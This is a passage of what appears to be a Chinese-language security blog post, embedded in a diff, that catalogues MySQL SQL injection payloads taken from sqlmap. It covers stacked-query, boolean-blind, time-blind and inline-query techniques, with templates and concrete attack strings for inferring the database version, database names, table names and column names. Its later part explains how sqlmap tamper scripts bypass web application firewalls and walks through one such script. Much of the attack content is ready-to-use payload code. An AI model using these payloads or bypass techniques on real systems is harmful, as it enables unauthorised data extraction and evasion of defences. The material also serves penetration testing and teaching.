+<ol>
+<li>数据库和API接口支持堆叠查询</li>
+<li>最好能看到执行的结果</li>
+</ol>
+<h3 id="Payloads-2"><a href="#Payloads-2" class="headerlink" title="Payloads"></a>Payloads</h3><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line"># Payload</span><br><span class="line"># 响应发生明显延迟</span><br><span class="line">;SELECT SLEEP(5) -- a</span><br></pre></td></tr></table></figure>
+
+<h4 id="推断数据库信息"><a href="#推断数据库信息" class="headerlink" title="推断数据库信息"></a>推断数据库信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line"># 如果[INFERENCE]正确，则延时执行</span><br><span class="line">;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line">;SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5(&apos;[RANDSTR]&apos;)),[RANDNUM])</span><br><span class="line">;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</span><br><span class="line"></span><br><span class="line"># 攻击 Payload</span><br><span class="line"># 判断数据库版本</span><br><span class="line">;SELECT IF((mid(version(),1,1)=5),SLEEP(3),1)</span><br><span class="line"># 推断数据库名</span><br><span class="line">;SELECT IF((ASCII(MID(DATABASE(),1,1))&gt;90),SLEEP(3),1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>布尔盲注（Boolean-based blind）即基于布尔值的方法，通过 SQL语句中真假条件的执行情况推断出数据库的信息，主要是根据网页的显示结果进行判断，这和 error-based 方法使用 SQL语句执行错误的回显信息不同，这里使用的查询语句是能正确执行的。</p>
+<p>利用条件：</p>
+<ol>
+<li>能使用 <code>AND</code>、<code>OR</code>、<code>NOT</code> 操作</li>
+<li>能通过网页响应判断 SQL 语句的执行情况</li>
+</ol>
+<h3 id="Payloads-3"><a href="#Payloads-3" class="headerlink" title="Payloads"></a>Payloads</h3><p>按种注入的流程，通常包括以下几种类型：判断注入点，推断数据库信息。</p>
+<h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">[AND, OR, OR NOT] [INFERENCE]</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND 1=1 -- a </span><br><span class="line">AND 1=2 -- a # 比较两个 payload 的结果，如果不同着说明存在注入点</span><br></pre></td></tr></table></figure>
+
+<h4 id="推断数据库信息-1"><a href="#推断数据库信息-1" class="headerlink" title="推断数据库信息"></a>推断数据库信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">[AND, OR, OR NOT] [INFERENCE]</span><br><span class="line"># 攻击 Payload</span><br><span class="line"># 使用字符串截取函数 substring | substri | mid | left | right ...</span><br><span class="line"># 判断版本</span><br><span class="line">and substring(version(),1,1)=5</span><br><span class="line">and right(left(version(),1),1)=5</span><br><span class="line">and left(version(),1)=4</span><br><span class="line">and ascii(lower(substr(Version(),1,1)))=51 # ascii 返回字符串第一个字符的 ascii 值</span><br><span class="line">and (select mid(version(),1,1)=4)</span><br><span class="line"># 数据库名、表名、列名(暴力、二分法)</span><br><span class="line"># 判断名字的长度</span><br><span class="line">AND SELECT LENGTH(DATABASE())&gt;10</span><br><span class="line"># 依次破解每一个字符</span><br><span class="line">AND SELECT SUBSTR(database(),1,1) &gt; &apos;a&apos;</span><br><span class="line">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;</span><br><span class="line">AND SELECT ASIIC(SUBSTR(table_name,1,1)) FROM information_schema.tables &gt; 110</span><br><span class="line">AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos;</span><br><span class="line"># 利用 Mysql MAKE_SET</span><br><span class="line"># MAKE_SET(bits,str1,str2,...)，strN 对应 bit(N-1)，bit(N-1) 为 1 则返回，</span><br><span class="line"># 如 MAKE_SET(3,&apos;A&apos;,&apos;B&apos;,&apos;C&apos;)，返回 ‘A&apos;,&apos;B&apos;</span><br><span class="line">select first_name from users where user_id=3 and make_set(length(database())&gt;4,1);</span><br><span class="line">select first_name from users where user_id=3 and make_set(ascii(mid(database(),2,1))&gt;118,1);</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><h3 id="概念-4"><a href="#概念-4" class="headerlink" title="概念"></a>概念</h3><p>延时盲注（Time-based blind）即基于延时的方法，同样通过 SQL语句中真假条件的执行情况推断出数据库的信息，但是使用延时执行的函数如 Mysql 中 <code>sleep</code>，使得不同条件执行查询的时间不同，自然网页上显示结果的时间存在差异，以此推断数据库的信息。</p>
+<p>利用条件：</p>
+<ol>
+<li>能使用延时函数如 Mysql 中的 <code>sleep</code> 函数</li>
+<li>能通过网页响应判断 SQL 语句的执行情况</li>
+</ol>
+<h3 id="Payloads-4"><a href="#Payloads-4" class="headerlink" title="Payloads"></a>Payloads</h3><h4 id="延时的方法"><a href="#延时的方法" class="headerlink" title="延时的方法"></a>延时的方法</h4><h5 id="SLEEP"><a href="#SLEEP" class="headerlink" title="SLEEP"></a>SLEEP</h5><p><code>SLEEP(n)</code>，延时 n 秒后执行</p>
+<h5 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h5><p> <code>BENCHMARK(loop_count,expr)</code>函数用来测试 SQL 语句或者函数的执行时间，第一个参数表示执行的次数，第二个参数表示要执行的操作。通常使用使用 MD5、SHA1 等函数，执行次数 100000。</p>
+<h5 id="GET-LOCK"><a href="#GET-LOCK" class="headerlink" title="GET_LOCK"></a>GET_LOCK</h5><p>MySQL 的<code>GET_LOCK(str, timeout)</code>函数尝试获取一个名字为 <code>str</code> 的锁 ，等待 <code>timeout</code>秒未获得，则终止函数，函数返回 0 值，成功则返回 1。利用条件是，开启两个 MySQL 数据库连接，先后在两个连接中使用 GET_LOCK 函数获取相同名字的锁，后面使用 GET_LOCK 函数的连接无法得到锁，等待 <code>timeout</code>秒后执行其它操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 第一个连接</span><br><span class="line">mysql&gt; select 1 and get_lock(&apos;fool&apos;,1);</span><br><span class="line">+--------------------------+</span><br><span class="line">| 1 and get_lock(&apos;fool&apos;,1) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        1 | # 获取成功，返回 1</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 第二个连接</span><br><span class="line">mysql&gt; select 1 and get_lock(&apos;fool&apos;, 3);</span><br><span class="line">+---------------------------+</span><br><span class="line">| 1 and get_lock(&apos;fool&apos;, 3) |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         0 | # 获取失败，返回 0 ，</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (3.00 sec)       # 等待了三秒后执行</span><br></pre></td></tr></table></figure>
+
+<h5 id="笛卡尔积-查询"><a href="#笛卡尔积-查询" class="headerlink" title="笛卡尔积 查询"></a>笛卡尔积 查询</h5><p>SQL 进行多表查询时，需要按照笛卡尔积乘的方式合成一个虚拟表进行查询，如三个表 （10，2）（100，3）（200，4）进行多表查询，最终合成一个虚拟表（200000，9），这种方式会导致最终的查询很费时。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.tables a, information_schema.tables b, information_schema.tables c;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 317214568 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (3.31 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="RLIKE-正则匹配"><a href="#RLIKE-正则匹配" class="headerlink" title="RLIKE 正则匹配"></a>RLIKE 正则匹配</h5><p>MySQL 中的 RLIKE 函数对字符串进行正则匹配，当目标字符串很长同时匹配规则复杂且失败的情况会相当的耗时。</p>
+<p><code>RPAD(str,len,padstr)</code> 函数为 <code>str</code>字符串右填充字符 <code>padstr</code>至总长度为 <code>len</code>，可以用于构造长字符串。</p>
+<p><code>REPEAT(str,count)</code>函数构成一个重复 <code>str</code>字符串 <code>count</code>次。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 根据实际情况调整，目标和匹配字符串的长度</span><br><span class="line">mysql&gt; select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (3.53 sec)</span><br></pre></td></tr></table></figure>
+
+<h4 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)</span><br><span class="line">AND 1 # 比较两个请求的响应时间</span><br></pre></td></tr></table></figure>
+
+<h4 id="推断数据库信息-2"><a href="#推断数据库信息-2" class="headerlink" title="推断数据库信息"></a>推断数据库信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line"># 1. 如果[INFERENCE]正确，则延时执行，同时响应错误</span><br><span class="line">AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line">AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5(&apos;[RANDSTR]&apos;)),[RANDNUM])</span><br><span class="line"># 使用 RLIKE 时会匹配表中的每一条数据，所总延时=查询表的行数 * SLEEPTIME，所以根据适当调小 SLEEPTIME，如0.1</span><br><span class="line">RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</span><br><span class="line"></span><br><span class="line"># 2. 如果[INFERENCE]正确，则延时执行，反之则不延时</span><br><span class="line">AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]))</span><br><span class="line">RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]))</span><br><span class="line"></span><br><span class="line"># 攻击 Payload</span><br><span class="line"># 判断数据库名字的长度</span><br><span class="line">AND 1=IF(LENGTH(DATABASE())&gt;5, SLEEP(5), 1) </span><br><span class="line"># 数据库名、表名、列名(暴力、二分法)</span><br><span class="line">AND (SELECT 1 FROM (SELECT(SLEEP(2-(IF(ascii(mid(database(),1,1))&gt;90,0,2)))))x)</span><br><span class="line">RLIKE(SELECT 1=IF(ASCII(MID(DATABASE(),2,1))&gt;118,SLEEP(0.5),1))</span><br></pre></td></tr></table></figure>
+
+<h2 id="内联查询"><a href="#内联查询" class="headerlink" title="内联查询"></a>内联查询</h2><h3 id="概念-5"><a href="#概念-5" class="headerlink" title="概念"></a>概念</h3><p>内联查询（Inline Queries）的格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT statemnt FROM (SELECT statement);</span><br></pre></td></tr></table></figure>
+
+<p><code>FROM</code>后面跟着的部分是一个 <code>SELECT</code>查询子句，这个子句产生的结果会保存在 内联视图（Inline View）中。视图和表的结构一样但没有实际存储的数据，它建立在其他的表或者视图上。</p>
+<blockquote>
+<p>内联查询通常用于和其它方法结合使用，如在报错注入中就很常用到内联查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; id=1&apos; AND (SELECT 7430 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(7430=7430,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &apos;IMUF&apos;=&apos;IMUF</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">(SELECT CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;))</span><br><span class="line"># 攻击 Paylaod，常和其它注入技巧结合使用，如报错</span><br><span class="line">(SELECT CONCAT(&apos;[DELIMITER_START]&apos;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&apos;[DELIMITER_STOP]&apos;))</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><h2 id="SQLMAP-中的绕过技巧"><a href="#SQLMAP-中的绕过技巧" class="headerlink" title="SQLMAP 中的绕过技巧"></a>SQLMAP 中的绕过技巧</h2><p>进行注入时，往往会遇到服务端主机装有 WAF（Web Application Firewall）对 Payload 进行过滤的情况，这使得注入攻击无法成功实施。但 WAF 往往是通过规则对攻击的 Payload 进行检测然后过滤，只要我们能绕过 WAF 的检测规则就能完成攻击。那么绕过的方法一般有哪些呢？我们可以透过 SQLMAP 中的绕过技术学习一二。</p>
+<p>SQLMAP 中有一个 Tamper 模块专为绕过 WAF 制定特殊的 Payload，<code>–-tamper</code>选项可以使用加载模块的不同绕过方法将Payload后进行注入。</p>
+<p>绕过的技巧通常有：</p>
+<ol>
+<li>字符编码转换</li>
+<li>同等功能转换</li>
+<li>使用注释符</li>
+</ol>
+<h3 id="字符编码转换"><a href="#字符编码转换" class="headerlink" title="字符编码转换"></a>字符编码转换</h3><p>SQLMAP 中 Tamper 模块中的很多脚本都使用字符的不同编码进行绕过，主要有的编码转换方式有：</p>
+<ul>
+<li>使用 base64 编码整个Payload</li>
+<li>Unicode 编码</li>
+<li>url 编码/双 url 编码</li>
+<li>utf-8 编码</li>
+<li>HTML 编码</li>
+</ul>
+<p>SQLMAP 中的 Tamper 脚本有：</p>
+<table>
+<thead>
+<tr>
+<th>Tamper 脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>base64encode</td>
+<td>base64 编码 Payload</td>
+</tr>
+<tr>
+<td>chardoubleencode</td>
+<td>双url编码</td>
+</tr>
+<tr>
+<td>charencode</td>
+<td>url编码</td>
+</tr>
+<tr>
+<td>charunicodeencode</td>
+<td>使用 Unicode 编码</td>
+</tr>
+<tr>
+<td>charunicodeescape</td>
+<td>使用 Unicode 编码</td>
+</tr>
+<tr>
+<td>apostrophemask</td>
+<td>使用 UTF-8 编码字符 <code>’</code>，<code>%EF%BC%87</code> 替换 <code>‘</code></td>
+</tr>
+<tr>
+<td>htmlencode</td>
+<td>使用 HTML 编码 Payload</td>
+</tr>
+<tr>
+<td>apostrophennullencode</td>
+<td>使用 <code>%00%27</code> 替换 <code>‘</code></td>
+</tr>
+<tr>
+<td>overlongutf8</td>
+<td>对非字符数字进行 UTF-8 编码，</td>
+</tr>
+<tr>
+<td>overlongutf8moremore</td>
+<td>对所有Payload 进行 UTF-8 编码</td>
+</tr>
+</tbody></table>
+<h3 id="同等功能转换"><a href="#同等功能转换" class="headerlink" title="同等功能转换"></a>同等功能转换</h3><p>当 WAF 过滤了特定函数或者关键字时，考虑使用其它方法实现该功能。SQLMAP Tamper 的脚本主要有：</p>
+<table>
+<thead>
+<tr>
+<th>Tamper 脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>between</td>
+<td>使用 <code>BETWEEN</code> 实现 <code>&gt;</code> 和 <code>=</code>的功能</td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td><code>LIMIT N OFFSET M</code> 替换<code>LIMIT M, N</code>  ，绕过逗号过滤</td>
+</tr>
+<tr>
+<td>commalessmid</td>
+<td><code>MID(A FROM B FOR C)</code> 替换  <code>MID(A, B, C)</code>，绕过逗号过滤</td>
+</tr>
+<tr>
+<td>concat2concatws</td>
+<td>使用 <code>concat_ws</code>函数替换 <code>concat</code>函数</td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td>使用 <code>LIKE</code> 替换 <code>=</code></td>
+</tr>
+<tr>
+<td>greatest</td>
+<td>使用 <code>GREATEST</code> 函数实现 <code>&gt;</code>的功能，<code>1 AND A&gt;B</code>转换为 <code>1 AND GREATEST(A, B+1)=A</code></td>
+</tr>
+<tr>
+<td>least</td>
+<td>使用 <code>LEAST</code> 函数实现 <code>&gt;</code>的功能，<code>1 AND A &gt; B</code> 转换为 <code>1 AND LEAST(A,B+1)=B+1</code></td>
+</tr>
+<tr>
+<td>ifnull2ifisnull</td>
+<td>使用 <code>IF(ISNULL(A), B, A)</code> 替换 <code>IFNULL(A, B)</code></td>
+</tr>
+<tr>
+<td>ifnull2casewhenisnull</td>
+<td>使用 替换 <code>CASE WHEN ISNULL(A) THEN (B) ELSE (A) END</code>替换<code>IFNULL(A, B)</code></td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>使用 <code>&amp;&amp;</code> 和 `</td>
+</tr>
+</tbody></table>
+<h3 id="使用注释符"><a href="#使用注释符" class="headerlink" title="使用注释符"></a>使用注释符</h3><p>注释符可以实现空格的替换、绕过函数过滤等。SQLMAP 中的 Tamper 脚本主要有：</p>
+<table>
+<thead>
+<tr>
+<th>Tamper 脚本</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>commentbeforeparentheses</td>
+<td>在括号前添加注释符 <code>/**/</code>，如 <code>ABS()</code> 变为 <code>ABS/**/()</code></td>
+</tr>
+<tr>
+<td>space2comment</td>
+<td>使用注释符<code>/**/</code>替换空格，<code>SELECT id FROM users</code> 转换为 <code>SELECT/**/id/**/FROM/**/users</code></td>
+</tr>
+<tr>
+<td>space2dash</td>
+<td>使用注释符 <code>–-</code>替换空格</td>
+</tr>
+<tr>
+<td>space2hash</td>
+<td>使用注释符 <code>#</code>替换空格</td>
+</tr>
+<tr>
+<td>space2morecomment</td>
+<td><code>SELECT id FROM users</code> 转换为 <code>SELECT/**_**/id/**_**/FROM/**_**/users</code></td>
+</tr>
+<tr>
+<td>randomcomments</td>
+<td>随机插入注释符 <code>/**/</code>，如 <code>INSERT</code> 变为 <code>I/**/NS/**/ERT</code></td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td>使用 MySQL 特有的注释符 <code>/*!*/</code>，保留关键字，在 MySQL 中<code>/*!内容*/</code>表示内容在 MySQL 中才执行，其它数据库中不会执行。</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td>使用 MySQL 特有的注释符 <code>/*!*/</code>，保留更多的关键字</td>
+</tr>
+</tbody></table>
+<h2 id="自定义-Tamper-脚本"><a href="#自定义-Tamper-脚本" class="headerlink" title="自定义 Tamper 脚本"></a>自定义 Tamper 脚本</h2><p>在实际情况中遇到的 WAF 多种多样，我们需要针对性地修改 Payload 以绕过过滤规则。所以很有必要学习如何编写 SQLMAP 的 Tamper 脚本。Tamper 脚本的编写其实还是比较容易的，主要涉及 Python 中的字符串替换的操作。一个 Tamper 脚本就是一个 Python 文件，当 SQLMAP 使用 <code>--tamper “tamper脚本名”</code> 就会调用相应的 Tamper 脚本对 Payload 进行特定的处理。</p>
+<p>以 SQLMAP 中一个很简单的 <code>equaltolike.py</code>Tamper 脚本为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"tamper script '%s' is unlikely to work against %s"</span> % (os.path.basename(__file__).split(<span class="string">"."</span>)[<span class="number">0</span>], DBMS.PGSQL))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls that</span></span><br><span class="line"><span class="string">          filter the equal character ('=')</span></span><br><span class="line"><span class="string">        * The LIKE operator is SQL standard. Hence, this tamper script</span></span><br><span class="line"><span class="string">          should work against all (?) databases</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1')</span></span><br><span class="line"><span class="string">    'SELECT * FROM users WHERE id LIKE 1'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = re.sub(<span class="string">r"\s*=\s*"</span>, <span class="string">" LIKE "</span>, retVal)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>脚本主要有三个部分：</p>
+<ul>
+<li><code>__priority__ = PRIORITY.HIGHEST</code></li>
+<li><code>dependencies()</code> 函数</li>
+<li><code>tamper(payload, **kwargs)</code> 函数</li>
+</ul>
+<p><code>__priority__ = PRIORITY.HIGHEST</code>用于声明脚本的优先级，在使用多个脚本时，需要通过该值判断脚本执行的先后顺序。通过 <code>from lib.core.enums import PRIORITY</code> 导入 <code>PRIORITY</code> 类，其声明如下，总共有 7 个等级。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span><span class="params">(object)</span>:</span></span><br><span class="line">    LOWEST = <span class="number">-100</span></span><br><span class="line">    LOWER = <span class="number">-50</span></span><br><span class="line">    LOW = <span class="number">-10</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    HIGH = <span class="number">10</span></span><br><span class="line">    HIGHER = <span class="number">50</span></span><br><span class="line">    HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<p>除了 <code>PRIORITY</code>这个 enum 类，<code>lib.core.enums</code> 中还有很多 SQLMAP 常用的 enum 类，如 DBMS 的名字、HTTP 请求的方法等。</p>
+<p><code>dependencies()</code>函数用于输出脚本的适用范围，调用 SQLMAP 自定义函数 <code>singleTimeWarnMessage</code> 进行输出，适用所有情况可以忽略说明，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><code>tamper(payload, **kwargs)</code> 函数使用 <code>re.sub</code>正则替换函数实现 Payload 中 <code>=</code> 和 <code>LIKE</code> 的替换。函数的第一参数为需要修改的 payload 字符串，第二个为SQLMAP 中的参数。</p>
+<p>因此，写 Tamper 脚本主要是在 <code>tamper()</code> 函数中实现 Payload 的修改。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li><a href="https://github.com/sqlmapproject/sqlmap/tree/master/data/xml" target="_blank" rel="noopener">sqlmap payload</a></li>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">sqlmap wiki</a></li>
+<li><a href="https://www.hacking8.com/sqlmap-parse/1.html" target="_blank" rel="noopener">sqlmap 源码解析&amp;技术总结</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" target="_blank" rel="noopener">PayloadsAllTheThings-MySQLInjection</a></li>
+<li><a href="https://www.scanforsecurity.com/scanning-techniques/sqlmap-advanced-guide.html" target="_blank" rel="noopener">Sqlmap Advanced Guide</a></li>
+<li><a href="https://www.1keydata.com/sql/inline-view.html" target="_blank" rel="noopener">Inline queries</a></li>
+<li><a href="https://www.cdxy.me/?p=789" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1380102" target="_blank" rel="noopener">sqlmap tamper脚本编写</a></li>
+</ol>
